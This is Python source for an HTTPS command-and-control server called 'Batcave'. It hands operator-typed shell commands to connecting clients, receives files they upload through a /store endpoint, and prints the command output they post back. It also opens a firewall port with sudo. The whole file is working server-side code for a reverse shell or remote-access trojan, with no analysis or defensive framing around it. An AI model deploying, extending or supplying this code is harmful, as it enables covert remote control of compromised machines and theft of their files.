import http.server
import cgi
import sys
import os
import base64
import ssl
import batsignal
from colorama import Fore


class MyHandler(http.server.BaseHTTPRequestHandler):
	def do_GET(self):
		command = input(Fore.YELLOW+f"Shell@{self.client_address[0]}>> "+Fore.WHITE)
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.end_headers()
		self.wfile.write(command.encode())
		
	
	def parse_header(self):
		return cgi.parse_header(self.headers.get("Content-type"))
		
	def get_filestorage(self):
		if self.ctype == "multipart/form-data":
			fs = cgi.FieldStorage(
				fp=self.rfile, 
				headers=self.headers, 
				environ={"REQUEST_METHOD":"POST"}
			)
			return fs
		else:
			print(Fore.RED+"[-] Unexpected POST request"+Fore.RESET)
			return None
	
	
	def write_to_file(self):
		with open(self.fs_name,"wb") as FILE:
			print(Fore.GREEN+"[+] Writing to file...")
			FILE.write(self.fs_up.file.read())
			self.send_response(200)
			self.end_headers()
			
			
	def do_POST(self):
		if self.path == "/store":
			try:
				self.ctype, pdict = self.parse_header()
				fs = self.get_filestorage()
				if not fs:
					return None
				else:
					self.fs_up = fs['file']
					self.fs_name = fs['name'].file.read()
					self.write_to_file()
			except Exception as ex:
				print(Fore.RED+f"[!] Something went wrong...{ex.__str__()}"+Fore.RESET)
		else:
			self.send_response(200)
			self.end_headers()
			length = int(self.headers["Content-length"])
			postVar = self.rfile.read(length)
			print(postVar.decode())
		


if __name__=="__main__":
	print(Fore.WHITE+"")
	batsignal.project()
	host_name = sys.argv[1]
	
	host_port = int(sys.argv[2])
	os.system('sudo ufw allow to any port {}'.format(host_port))
	print(Fore.WHITE+f"[!] Batcave listening on port {host_port}....")

	server_class = http.server.HTTPServer
	httpd = server_class((host_name, host_port), MyHandler)
	httpd.socket = ssl.wrap_socket(
		httpd.socket, 
		keyfile="./serverkey.pem", 
		certfile='./server.pem', 
		server_side = True,  
		ssl_version=ssl.PROTOCOL_TLS
	)
	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		print(Fore.BLUE+"\n[+] Server is terminated...")
os.system('sudo ufw delete allow to any port {}'.format(host_port))
print(Fore.RESET+"")

